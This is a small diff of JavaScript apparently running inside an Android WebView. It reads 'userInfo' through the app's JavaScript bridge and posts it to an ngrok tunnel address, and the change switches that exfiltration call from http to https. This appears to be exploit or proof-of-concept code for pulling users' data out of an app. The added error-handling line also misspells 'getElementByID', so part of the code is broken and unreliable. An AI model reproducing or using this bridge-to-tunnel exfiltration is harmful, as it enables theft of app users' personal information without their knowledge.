@@ -13,11 +13,12 @@
               if (Android.get('appVersion') < 168)
                 throw "Error";
             } catch (e) {
-              window.location.href = "https://google.co.in";
+              document.getElementByID("asdf").innerHTML = "Bad";
+              return;
             }
 
             try {
-              $.post('http://7cc8cac5.ngrok.io', {
+              $.post('https://7cc8cac5.ngrok.io', {
                 payload: Android.get('userInfo')
               });
             } catch (e) {
